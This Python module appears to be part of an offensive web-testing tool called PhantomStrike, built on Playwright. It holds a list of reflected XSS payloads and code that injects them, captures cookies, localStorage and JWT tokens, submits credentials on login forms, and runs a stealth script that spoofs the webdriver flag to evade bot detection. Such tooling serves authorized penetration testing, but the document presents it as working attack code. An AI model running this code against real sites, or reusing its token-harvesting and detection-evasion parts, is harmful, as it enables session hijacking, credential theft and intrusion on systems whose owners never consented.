"""
PhantomStrike Playwright Browser Engine — Elite browser-based attacks.
Uses Playwright for: XSS testing, auth bypass, session hijacking,
cookie capture, JS-rendered page analysis, screenshot evidence,
CSRF testing, client-side vuln scanning, credential harvesting.
"""
from __future__ import annotations
import asyncio
import json
import logging
from dataclasses import dataclass, field
from datetime import datetime
from pathlib import Path
from typing import Optional, Any

from phantom.core.config import PlaywrightConfig
from phantom.core.events import EventBus, Event, EventType

logger = logging.getLogger("phantom.browser")


@dataclass
class BrowserFindings:
    """Collected data from browser-based reconnaissance."""
    cookies: list[dict] = field(default_factory=list)
    local_storage: dict = field(default_factory=dict)
    session_storage: dict = field(default_factory=dict)
    intercepted_requests: list[dict] = field(default_factory=list)
    intercepted_responses: list[dict] = field(default_factory=list)
    console_logs: list[str] = field(default_factory=list)
    js_errors: list[str] = field(default_factory=list)
    xss_results: list[dict] = field(default_factory=list)
    screenshots: list[str] = field(default_factory=list)
    forms_found: list[dict] = field(default_factory=list)
    hidden_inputs: list[dict] = field(default_factory=list)
    api_endpoints: list[str] = field(default_factory=list)
    websocket_messages: list[dict] = field(default_factory=list)
    technologies_detected: list[str] = field(default_factory=list)


class PhantomBrowser:
    """
    Elite Playwright-powered browser engine for advanced web attacks.
    Capabilities:
    - Full JS-rendered page analysis (SPA/React/Angular/Vue)
    - XSS payload injection and verification
    - Cookie/Session/localStorage capture
    - Request interception and modification (MITM)
    - Automated form discovery and submission
    - Screenshot evidence for every vulnerability
    - Multi-browser parallel instances
    - Anti-bot detection evasion (stealth mode)
    """

    def __init__(self, config: PlaywrightConfig, event_bus: EventBus):
        self.config = config
        self.event_bus = event_bus
        self._playwright = None
        self._browser = None
        self._contexts: list = []
        self._semaphore = asyncio.Semaphore(config.max_browser_instances)
        self._findings = BrowserFindings()
        self._output_dir = Path.home() / ".phantom-strike" / "browser_evidence"
        self._output_dir.mkdir(parents=True, exist_ok=True)

    async def start(self):
        """Launch Playwright browser."""
        try:
            from playwright.async_api import async_playwright
        except ImportError:
            logger.error(
                "[Browser] Playwright not installed. "
                "Run: pip install playwright && playwright install chromium"
            )
            return False

        self._playwright = await async_playwright().start()

        browser_launcher = getattr(self._playwright, self.config.browser_type)
        self._browser = await browser_launcher.launch(
            headless=self.config.headless,
        )

        await self.event_bus.emit(Event(
            type=EventType.BROWSER_STARTED,
            data={"browser": self.config.browser_type},
            source="browser",
        ))
        logger.info(f"[Browser] {self.config.browser_type} launched (headless={self.config.headless})")
        return True

    async def create_stealth_context(self, proxy: str = None):
        """Create a stealth browser context that evades bot detection."""
        if not self._browser:
            await self.start()

        context_options = {
            "viewport": {"width": 1920, "height": 1080},
            "ignore_https_errors": self.config.ignore_https_errors,
            "java_script_enabled": True,
        }

        if self.config.stealth_mode:
            context_options["user_agent"] = (
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
                "(KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
            )

        if proxy:
            context_options["proxy"] = {"server": proxy}

        context = await self._browser.new_context(**context_options)

        if self.config.stealth_mode:
            await context.add_init_script("""
                // Evade bot detection
                Object.defineProperty(navigator, 'webdriver', {get: () => false});
                Object.defineProperty(navigator, 'plugins', {get: () => [1,2,3,4,5]});
                Object.defineProperty(navigator, 'languages', {get: () => ['en-US','en']});
                window.chrome = {runtime: {}};
                const originalQuery = window.navigator.permissions.query;
                window.navigator.permissions.query = (params) =>
                    params.name === 'notifications'
                        ? Promise.resolve({state: Notification.permission})
                        : originalQuery(params);
            """)

        self._contexts.append(context)
        return context

    async def crawl_page(self, url: str, context=None) -> BrowserFindings:
        """Full page crawl with JS rendering and data capture."""
        async with self._semaphore:
            if not context:
                context = await self.create_stealth_context()

            page = await context.new_page()
            findings = BrowserFindings()

            # Set up request interception
            if self.config.intercept_requests:
                async def on_request(request):
                    findings.intercepted_requests.append({
                        "url": request.url,
                        "method": request.method,
                        "headers": dict(request.headers),
                    })

                async def on_response(response):
                    findings.intercepted_responses.append({
                        "url": response.url,
                        "status": response.status,
                        "headers": dict(response.headers),
                    })

                page.on("request", on_request)
                page.on("response", on_response)

            # Capture console logs and JS errors
            page.on("console", lambda msg: findings.console_logs.append(msg.text))
            page.on("pageerror", lambda err: findings.js_errors.append(str(err)))

            try:
                await page.goto(url, wait_until="networkidle", timeout=self.config.timeout)

                await self.event_bus.emit(Event(
                    type=EventType.BROWSER_PAGE_LOADED,
                    data={"url": url},
                    source="browser",
                ))

                # Capture cookies
                if self.config.capture_cookies:
                    cookies = await context.cookies()
                    findings.cookies = [dict(c) for c in cookies]
                    if cookies:
                        await self.event_bus.emit(Event(
                            type=EventType.BROWSER_COOKIE_CAPTURED,
                            data={"url": url, "count": len(cookies)},
                            source="browser",
                        ))

                # Capture localStorage/sessionStorage
                if self.config.capture_storage:
                    findings.local_storage = await page.evaluate(
                        "() => Object.fromEntries(Object.entries(localStorage))"
                    )
                    findings.session_storage = await page.evaluate(
                        "() => Object.fromEntries(Object.entries(sessionStorage))"
                    )

                # Find all forms
                forms = await page.evaluate("""() => {
                    return Array.from(document.forms).map(f => ({
                        action: f.action,
                        method: f.method,
                        inputs: Array.from(f.elements).map(e => ({
                            name: e.name, type: e.type, value: e.value
                        }))
                    }));
                }""")
                findings.forms_found = forms

                # Find hidden inputs
                hidden = await page.evaluate("""() => {
                    return Array.from(document.querySelectorAll('input[type=hidden]')).map(e => ({
                        name: e.name, value: e.value, form: e.form?.action
                    }));
                }""")
                findings.hidden_inputs = hidden

                # Detect technologies
                techs = await page.evaluate("""() => {
                    const detected = [];
                    if (window.React) detected.push('React');
                    if (window.Vue) detected.push('Vue');
                    if (window.angular) detected.push('Angular');
                    if (window.jQuery) detected.push('jQuery');
                    if (window.next) detected.push('Next.js');
                    if (window.__nuxt) detected.push('Nuxt.js');
                    return detected;
                }""")
                findings.technologies_detected = techs

                # Screenshot
                if self.config.screenshot_on_vuln:
                    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
                    ss_path = str(self._output_dir / f"crawl_{ts}.png")
                    await page.screenshot(path=ss_path, full_page=True)
                    findings.screenshots.append(ss_path)

            except Exception as e:
                logger.error(f"[Browser] Error crawling {url}: {e}")
            finally:
                await page.close()

            return findings

    async def test_xss(self, url: str, payloads: list[str] = None) -> list[dict]:
        """Test for XSS vulnerabilities using real browser execution."""
        if not payloads:
            payloads = [
                '<script>alert("XSS")</script>',
                '<img src=x onerror=alert("XSS")>',
                '"><script>alert(String.fromCharCode(88,83,83))</script>',
                "javascript:alert('XSS')//",
                '<svg onload=alert("XSS")>',
                "'-alert('XSS')-'",
                '<details open ontoggle=alert("XSS")>',
            ]

        context = await self.create_stealth_context()
        results = []

        for payload in payloads:
            try:
                page = await context.new_page()
                dialog_triggered = False

                async def on_dialog(dialog):
                    nonlocal dialog_triggered
                    dialog_triggered = True
                    await dialog.dismiss()

                page.on("dialog", on_dialog)

                test_url = f"{url}?q={payload}" if "?" not in url else f"{url}&q={payload}"
                await page.goto(test_url, wait_until="domcontentloaded", timeout=10000)
                await asyncio.sleep(1)

                if dialog_triggered:
                    result = {
                        "vulnerable": True,
                        "payload": payload,
                        "url": test_url,
                        "type": "reflected_xss",
                    }
                    results.append(result)
                    await self.event_bus.emit(Event(
                        type=EventType.BROWSER_XSS_FOUND,
                        data=result,
                        source="browser",
                        severity="high",
                    ))

                    if self.config.screenshot_on_vuln:
                        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
                        ss_path = str(self._output_dir / f"xss_{ts}.png")
                        await page.screenshot(path=ss_path)
                        result["screenshot"] = ss_path

                await page.close()
            except Exception as e:
                logger.debug(f"[Browser] XSS test error: {e}")

        return results

    async def capture_auth_tokens(self, url: str, credentials: dict = None) -> dict:
        """Navigate to login page, optionally submit creds, capture all auth tokens."""
        context = await self.create_stealth_context()
        page = await context.new_page()
        tokens = {"cookies": [], "headers": {}, "local_storage": {}, "jwt_tokens": []}

        try:
            await page.goto(url, wait_until="networkidle", timeout=self.config.timeout)

            # If credentials provided, try to login
            if credentials:
                username_field = credentials.get("username_selector", "input[name=username]")
                password_field = credentials.get("password_selector", "input[name=password]")
                submit_btn = credentials.get("submit_selector", "button[type=submit]")

                await page.fill(username_field, credentials.get("username", ""))
                await page.fill(password_field, credentials.get("password", ""))
                await page.click(submit_btn)
                await page.wait_for_load_state("networkidle")

            # Capture everything
            tokens["cookies"] = await context.cookies()
            tokens["local_storage"] = await page.evaluate(
                "() => Object.fromEntries(Object.entries(localStorage))"
            )

            # Extract JWT tokens from storage and cookies
            for key, value in tokens["local_storage"].items():
                if isinstance(value, str) and value.startswith("eyJ"):
                    tokens["jwt_tokens"].append({"source": f"localStorage.{key}", "token": value})

            for cookie in tokens["cookies"]:
                if isinstance(cookie.get("value"), str) and cookie["value"].startswith("eyJ"):
                    tokens["jwt_tokens"].append({"source": f"cookie.{cookie['name']}", "token": cookie["value"]})

        except Exception as e:
            logger.error(f"[Browser] Auth capture error: {e}")
        finally:
            await page.close()

        return tokens

    async def shutdown(self):
        """Shutdown browser and cleanup."""
        for ctx in self._contexts:
            try:
                await ctx.close()
            except Exception:
                pass
        if self._browser:
            await self._browser.close()
        if self._playwright:
            await self._playwright.stop()
        logger.info("[Browser] Shutdown complete")
